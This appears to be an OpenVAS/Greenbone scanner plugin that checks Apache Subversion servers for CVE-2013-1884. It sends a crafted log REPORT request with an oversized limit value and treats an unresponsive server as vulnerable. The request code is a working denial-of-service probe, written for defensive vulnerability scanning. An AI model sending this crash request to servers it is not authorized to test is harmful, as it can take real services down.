if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802054" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_bugtraq_id( 58898 );
	script_cve_id( "CVE-2013-1884" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-06-06 15:08:09 +0530 (Thu, 06 Jun 2013)" );
	script_name( "Apache Subversion 'mod_dav_svn' log REPORT Request DoS Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/52966/" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/83259" );
	script_xref( name: "URL", value: "http://subversion.apache.org/security/CVE-2013-1884-advisory.txt" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_get_http_banner.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Apache_SVN/banner" );
	script_tag( name: "affected", value: "Apache Subversion 1.7.0 through 1.7.8" );
	script_tag( name: "insight", value: "An error within the 'mod_dav_svn' module when handling crafted log 'REPORT'
  request with a limit outside the allowed range." );
	script_tag( name: "solution", value: "Upgrade to Apache Subversion version 1.7.9 or later." );
	script_tag( name: "summary", value: "The host is running Apache Subversion and is prone denial of
  service vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will let the remote attackers to cause a segfault
  by sending crafted log 'REPORT' request.

  NOTE : Configurations which allow anonymous read access to the repository
  will be vulnerable to this without authentication." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
h_port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: h_port );
if(!banner || !IsMatchRegexp( banner, "Server: Apache.* SVN" )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: h_port );
if(http_is_dead( port: h_port )){
	exit( 0 );
}
comman_data = NASLString( "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n", "<S:log-report xmlns:S=\"svn:\">\n", "<S:start-revision>0</S:start-revision>\n", "<S:end-revision>1</S:end-revision>\n" );
limit_inside = NASLString( comman_data, "<S:limit>1</S:limit>\n", "</S:log-report>\n" );
limit_outside = NASLString( comman_data, "<S:limit>123456789123456789123456789</S:limit>\n", "</S:log-report>\n" );
for path in nasl_make_list_unique( "/", "/repo/", "/repository/", "/trunk/", "/svn/", "/svn/trunk/", "/repo/trunk/", "/repo/projects/", "/projects/", "/svn/repos/", http_cgi_dirs( port: h_port ) ) {
	req1 = http_get( item: NASLString( path ), port: h_port );
	res1 = http_keepalive_send_recv( port: h_port, data: req1 );
	if(( !IsMatchRegexp( res1, "^HTTP/1\\.[01] 200" ) )){
		continue;
	}
	common_req = NASLString( "REPORT ", path, "!svn/bc/1/", " HTTP/1.1", "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Host: ", host, "\\r\\n", "Accept: */*\\r\\n" );
	normal_req = NASLString( common_req, "Content-Length: ", strlen( limit_inside ), "\\r\\n\\r\\n", limit_inside );
	normal_res = http_keepalive_send_recv( port: h_port, data: normal_req );
	if(( !IsMatchRegexp( normal_res, "^HTTP/1\\.[01] 200" ) && !ContainsString( normal_res, "<S:log-report" ) )){
		continue;
	}
	crafted_req = NASLString( common_req, "Content-Length: ", strlen( limit_outside ), "\\r\\n\\r\\n", limit_outside );
	crafted_res = http_keepalive_send_recv( port: h_port, data: crafted_req );
	if(( IsMatchRegexp( crafted_res, "^HTTP/1\\.[01] 400" ) && ContainsString( crafted_res, "human-readable errcode=" ) )){
		exit( 0 );
	}
	if(isnull( crafted_res ) || strlen( crafted_res ) < 3){
		crafted_res = http_keepalive_send_recv( port: h_port, data: crafted_req );
		if(isnull( crafted_res ) || strlen( crafted_res ) < 3){
			security_message( port: h_port );
			exit( 0 );
		}
	}
	if(http_is_dead( port: h_port )){
		security_message( port: h_port );
		exit( 0 );
	}
}
exit( 99 );

